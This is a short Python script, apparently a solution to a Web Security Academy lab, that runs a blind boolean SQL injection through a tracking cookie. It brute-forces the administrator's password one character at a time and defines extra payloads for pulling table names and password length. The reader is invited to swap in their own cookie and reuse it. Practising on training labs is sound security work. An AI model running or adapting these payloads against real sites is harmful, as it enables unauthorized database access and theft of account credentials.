"""
Hello, hackers.  

1- don't forget to replace my cookie to your cookie 
2- also change to num of range if you'll use Payload_passwd,payload_tableName,payload_length_passwd
"""


import sys    #  import that to be coooooool
import requests

url = "https://0aed00f40432c1fc804e4f9800550052.web-security-academy.net/"
Payload_passwd="' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1 OFFSET 0) ='a' --"
payload_tableName="' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema() LIMIT 1 OFFSET 0),1,1)='a'--"
payload_length_passwd= "' AND (SELECT LENGTH(password) FROM users WHERE username='administrator'  LIMIT 1 OFFSET 0)=20 --"



table = ""

for l in range(1, 20):
    for asc in range(32, 127):
        cookie = {
            "TrackingId": f"4YjeqKNvsRX5Isup' AND (SELECT SUBSTRING(password,{l},1) FROM users WHERE username='administrator') ='{chr(asc)}",
            "session": "76BMsf8gtjU2OP8rJYDZAjafvfdAcmfz"
        }

        resp = requests.get(url=url, cookies=cookie)
        if "Welcome back!" in resp.text:
            table += chr(asc)
            sys.stdout.write("\rTrying: " + table )
            sys.stdout.flush()                                           # i use  that to be cool
            break
        else:
            

            sys.stdout.write("\r Trying: " + table+ chr(asc))
            sys.stdout.flush()                                          # i use that to be cool

print(f"\nFinally: {table}")
 
